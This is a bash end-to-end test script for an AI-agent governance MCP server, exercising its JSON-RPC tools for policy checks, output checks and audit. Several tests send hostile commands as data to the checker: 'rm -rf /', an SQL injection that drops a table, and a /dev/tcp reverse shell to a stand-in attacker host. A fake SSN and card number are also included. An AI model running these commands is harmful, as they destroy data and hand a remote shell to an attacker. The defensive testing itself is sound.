#!/usr/bin/env bash
# Claude Code MCP Server E2E — verifies the MCP server protocol endpoint
# with all 5 governance tools via JSON-RPC 2.0.
#
# Usage:
#   ./test_claude_code_mcp_server.sh
#
# Environment:
#   AXONFLOW_ENDPOINT  (default: http://localhost:8080)
#   AXONFLOW_CLIENT_ID (default: test-client)
#   AXONFLOW_CLIENT_SECRET (default: test-secret)
set -euo pipefail

BASE_URL="${AXONFLOW_ENDPOINT:-http://localhost:8080}"
CLIENT_ID="${AXONFLOW_CLIENT_ID:-community}"
CLIENT_SECRET="${AXONFLOW_CLIENT_SECRET:-test-secret}"
AUTH=$(echo -n "${CLIENT_ID}:${CLIENT_SECRET}" | base64)
MCP_ENDPOINT="${BASE_URL}/api/v1/mcp-server"

PASS=0
FAIL=0
SESSION_ID=""

assert_status() {
    local desc="$1" status="$2" expected="$3"
    if [ "$status" = "$expected" ]; then
        echo "  PASS: $desc (HTTP $status)"
        ((PASS++)) || true
    else
        echo "  FAIL: $desc (expected HTTP $expected, got $status)"
        ((FAIL++)) || true
    fi
}

assert_contains() {
    local desc="$1" response="$2" expected="$3"
    if echo "$response" | grep -q "$expected"; then
        echo "  PASS: $desc"
        ((PASS++)) || true
    else
        echo "  FAIL: $desc (expected '$expected' in response)"
        ((FAIL++)) || true
    fi
}

assert_not_contains() {
    local desc="$1" response="$2" unexpected="$3"
    if echo "$response" | grep -q "$unexpected"; then
        echo "  FAIL: $desc (found unexpected '$unexpected')"
        ((FAIL++)) || true
    else
        echo "  PASS: $desc"
        ((PASS++)) || true
    fi
}

jsonrpc_post() {
    local body="$1"
    local extra_headers="${2:-}"
    local cmd=(curl -s -w "\n%{http_code}" -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" -H "Authorization: Basic $AUTH")
    if [ -n "$SESSION_ID" ]; then
        cmd+=(-H "Mcp-Session-Id: $SESSION_ID")
    fi
    if [ -n "$extra_headers" ]; then
        cmd+=(-H "$extra_headers")
    fi
    cmd+=(-d "$body" "$MCP_ENDPOINT")
    "${cmd[@]}"
}

extract_body() { echo "$1" | sed '$d'; }
extract_status() { echo "$1" | tail -1; }

echo "========================================"
echo " Claude Code MCP Server E2E Tests"
echo "========================================"
echo "Endpoint: $MCP_ENDPOINT"
echo ""

# -----------------------------------------------
# Test 1: Health check via ping (requires session)
# -----------------------------------------------
echo "--- Test 1: Ping (pre-auth — should fail in enterprise mode) ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"ping-pre","method":"ping"}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
# In community mode this will pass, in enterprise it returns 401
if [ "$STATUS" = "200" ]; then
    assert_contains "Ping result" "$BODY" '"result"'
    echo "  (community mode — no auth required)"
elif [ "$STATUS" = "401" ]; then
    assert_status "Ping requires auth" "$STATUS" "401"
    echo "  (enterprise mode — auth required)"
else
    assert_status "Ping returns 200 or 401" "$STATUS" "200"
fi

# -----------------------------------------------
# Test 2: Initialize — creates session
# -----------------------------------------------
echo ""
echo "--- Test 2: Initialize (create session) ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"init-1","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"e2e-test","version":"1.0.0"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Initialize returns 200" "$STATUS" "200"
assert_contains "Protocol version in result" "$BODY" '"protocolVersion"'
assert_contains "Server info" "$BODY" '"axonflow"'

# Extract session ID from response headers
SESSION_ID=$(curl -s -D - -o /dev/null -H "Content-Type: application/json" -H "Accept: application/json" \
    -H "Authorization: Basic $AUTH" \
    -d '{"jsonrpc":"2.0","id":"init-header","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"e2e-test","version":"1.0.0"}}}' \
    "$MCP_ENDPOINT" 2>/dev/null | grep -i "Mcp-Session-Id" | tr -d '\r' | awk '{print $2}')
if [ -n "$SESSION_ID" ]; then
    echo "  PASS: Session ID received: ${SESSION_ID:0:20}..."
    ((PASS++)) || true
else
    echo "  FAIL: No Mcp-Session-Id header in response"
    ((FAIL++)) || true
fi

# -----------------------------------------------
# Test 3: Tools list — returns 5 tools
# -----------------------------------------------
echo ""
echo "--- Test 3: Tools list ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"list-1","method":"tools/list"}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "tools/list returns 200" "$STATUS" "200"
assert_contains "check_policy tool" "$BODY" "check_policy"
assert_contains "check_output tool" "$BODY" "check_output"
assert_contains "audit_tool_call tool" "$BODY" "audit_tool_call"
assert_contains "list_policies tool" "$BODY" "list_policies"
assert_contains "get_policy_stats tool" "$BODY" "get_policy_stats"

# -----------------------------------------------
# Test 4: check_policy — safe command (allowed)
# -----------------------------------------------
echo ""
echo "--- Test 4: check_policy — safe command ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-safe","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"claude_code.Bash","statement":"echo hello world","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Safe command returns 200" "$STATUS" "200"
assert_contains "Allowed" "$BODY" 'allowed'

# -----------------------------------------------
# Test 5: check_policy — dangerous command (rm -rf)
# -----------------------------------------------
echo ""
echo "--- Test 5: check_policy — dangerous command (rm -rf /) ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-danger","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"claude_code.Bash","statement":"rm -rf /","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Dangerous command returns 200" "$STATUS" "200"
# Extract the tool result text and check if blocked
TOOL_RESULT=$(echo "$BODY" | python3 -c "import json,sys; r=json.load(sys.stdin); print(r['result']['content'][0]['text'])" 2>/dev/null || echo "")
if echo "$TOOL_RESULT" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); sys.exit(0 if not d.get('allowed', True) else 1)" 2>/dev/null; then
    echo "  PASS: Dangerous command blocked"
    ((PASS++)) || true
else
    echo "  INFO: Dangerous command not blocked (may need sys_dangerous policies loaded)"
    assert_contains "Has result content" "$BODY" '"content"'
fi

# -----------------------------------------------
# Test 6: check_policy — SQL injection
# -----------------------------------------------
echo ""
echo "--- Test 6: check_policy — SQL injection ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-sqli","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"claude_code.mcp__postgres","statement":"SELECT * FROM users; DROP TABLE users;--","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "SQLi check returns 200" "$STATUS" "200"
assert_contains "Has result" "$BODY" '"content"'

# -----------------------------------------------
# Test 7: check_policy — reverse shell
# -----------------------------------------------
echo ""
echo "--- Test 7: check_policy — reverse shell ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-revshell","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"claude_code.Bash","statement":"bash -i >& /dev/tcp/attacker.com/4444 0>&1","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Reverse shell check returns 200" "$STATUS" "200"
assert_contains "Has result" "$BODY" '"content"'

# -----------------------------------------------
# Test 8: check_output — clean text
# -----------------------------------------------
echo ""
echo "--- Test 8: check_output — clean text ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"co-clean","method":"tools/call","params":{"name":"check_output","arguments":{"connector_type":"claude_code.Bash","message":"Build succeeded. 42 tests passed, 0 failed."}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Clean output returns 200" "$STATUS" "200"
assert_contains "Has result" "$BODY" '"content"'

# -----------------------------------------------
# Test 9: check_output — text with SSN
# -----------------------------------------------
echo ""
echo "--- Test 9: check_output — PII (SSN) ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"co-ssn","method":"tools/call","params":{"name":"check_output","arguments":{"connector_type":"claude_code.Bash","message":"Customer SSN is 123-45-6789 and card is 4111-1111-1111-1111"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "PII output returns 200" "$STATUS" "200"
assert_contains "Has result" "$BODY" '"content"'

# -----------------------------------------------
# Test 10: check_policy — missing required args
# -----------------------------------------------
echo ""
echo "--- Test 10: check_policy — missing required args ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-missing","method":"tools/call","params":{"name":"check_policy","arguments":{}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Missing args returns 200" "$STATUS" "200"
assert_contains "isError true" "$BODY" '"isError"'

# -----------------------------------------------
# Test 11: audit_tool_call
# -----------------------------------------------
echo ""
echo "--- Test 11: audit_tool_call ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"audit-1","method":"tools/call","params":{"name":"audit_tool_call","arguments":{"tool_name":"Bash","tool_type":"claude_code","input":{"command":"echo hello"},"output":{"stdout":"hello"},"success":true,"duration_ms":42}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Audit returns 200" "$STATUS" "200"
# May fail if orchestrator is not running — that's expected in unit test mode
if echo "$BODY" | grep -q "isError"; then
    echo "  INFO: Audit call returned error (orchestrator may not be running)"
else
    assert_contains "Audit recorded" "$BODY" "recorded"
fi

# -----------------------------------------------
# Test 12: list_policies
# -----------------------------------------------
echo ""
echo "--- Test 12: list_policies ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"lp-1","method":"tools/call","params":{"name":"list_policies","arguments":{}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "List policies returns 200" "$STATUS" "200"
if echo "$BODY" | grep -q "isError"; then
    echo "  INFO: List policies returned error (orchestrator may not be running)"
else
    assert_contains "Policies result" "$BODY" "policies"
fi

# -----------------------------------------------
# Test 13: get_policy_stats
# -----------------------------------------------
echo ""
echo "--- Test 13: get_policy_stats ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"stats-1","method":"tools/call","params":{"name":"get_policy_stats","arguments":{"from":"2026-04-01","to":"2026-04-03"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Policy stats returns 200" "$STATUS" "200"
if echo "$BODY" | grep -q "isError"; then
    echo "  INFO: Policy stats returned error (orchestrator may not be running)"
fi

# -----------------------------------------------
# Test 14: Unknown tool
# -----------------------------------------------
echo ""
echo "--- Test 14: Unknown tool ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"unk-1","method":"tools/call","params":{"name":"fake_tool","arguments":{}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Unknown tool returns 200" "$STATUS" "200"
assert_contains "Error response" "$BODY" '"error"'

# -----------------------------------------------
# Test 15: Invalid JSON
# -----------------------------------------------
echo ""
echo "--- Test 15: Invalid JSON ---"
RESPONSE=$(curl -s -w "\n%{http_code}" -H "Content-Type: application/json" -H "Authorization: Basic $AUTH" -d 'not json' "$MCP_ENDPOINT")
STATUS=$(extract_status "$RESPONSE")
assert_status "Invalid JSON returns 400" "$STATUS" "400"

# -----------------------------------------------
# Test 16: Wrong Content-Type
# -----------------------------------------------
echo ""
echo "--- Test 16: Wrong Content-Type ---"
RESPONSE=$(curl -s -w "\n%{http_code}" -H "Content-Type: text/plain" -H "Authorization: Basic $AUTH" -d '{"jsonrpc":"2.0","id":"ct","method":"ping"}' "$MCP_ENDPOINT")
STATUS=$(extract_status "$RESPONSE")
assert_status "Wrong Content-Type returns 415" "$STATUS" "415"

# -----------------------------------------------
# Test 17: Invalid protocol version
# -----------------------------------------------
echo ""
echo "--- Test 17: Invalid protocol version ---"
RESPONSE=$(curl -s -w "\n%{http_code}" -H "Content-Type: application/json" -H "MCP-Protocol-Version: 1999-01-01" -H "Authorization: Basic $AUTH" -d '{"jsonrpc":"2.0","id":"pv","method":"ping"}' "$MCP_ENDPOINT")
STATUS=$(extract_status "$RESPONSE")
assert_status "Invalid protocol version returns 400" "$STATUS" "400"

# -----------------------------------------------
# Test 18: Unknown JSON-RPC method
# -----------------------------------------------
echo ""
echo "--- Test 18: Unknown JSON-RPC method ---"
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"method-unk","method":"resources/list"}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
assert_status "Unknown method returns 200" "$STATUS" "200"
assert_contains "Method not found" "$BODY" "Method not found"

# -----------------------------------------------
# Test 19: Notification (no ID)
# -----------------------------------------------
echo ""
echo "--- Test 19: Notification (no ID) ---"
RESPONSE=$(curl -s -w "\n%{http_code}" -H "Content-Type: application/json" -H "Authorization: Basic $AUTH" -d '{"jsonrpc":"2.0","method":"notifications/initialized"}' "$MCP_ENDPOINT")
STATUS=$(extract_status "$RESPONSE")
assert_status "Notification returns 202" "$STATUS" "202"

# -----------------------------------------------
# Test 20: CORS preflight
# -----------------------------------------------
echo ""
echo "--- Test 20: CORS preflight ---"
RESPONSE=$(curl -s -w "\n%{http_code}" -X OPTIONS -H "Origin: https://example.com" "$MCP_ENDPOINT")
STATUS=$(extract_status "$RESPONSE")
assert_status "CORS preflight returns 204" "$STATUS" "204"

# -----------------------------------------------
# Test 21: Session delete
# -----------------------------------------------
echo ""
echo "--- Test 21: Session delete ---"
if [ -n "$SESSION_ID" ]; then
    RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE -H "Mcp-Session-Id: $SESSION_ID" -H "Authorization: Basic $AUTH" "$MCP_ENDPOINT")
    STATUS=$(extract_status "$RESPONSE")
    assert_status "Session delete returns 200" "$STATUS" "200"
else
    echo "  SKIP: No session to delete"
fi

# -----------------------------------------------
# Summary
# -----------------------------------------------
echo ""
echo "========================================"
echo " Results"
echo "========================================"
echo "Passed: $PASS"
echo "Failed: $FAIL"
echo ""

if [ "$FAIL" -gt 0 ]; then
    echo "FAIL: $FAIL test(s) failed"
    exit 1
else
    echo "ALL $PASS tests passed"
fi
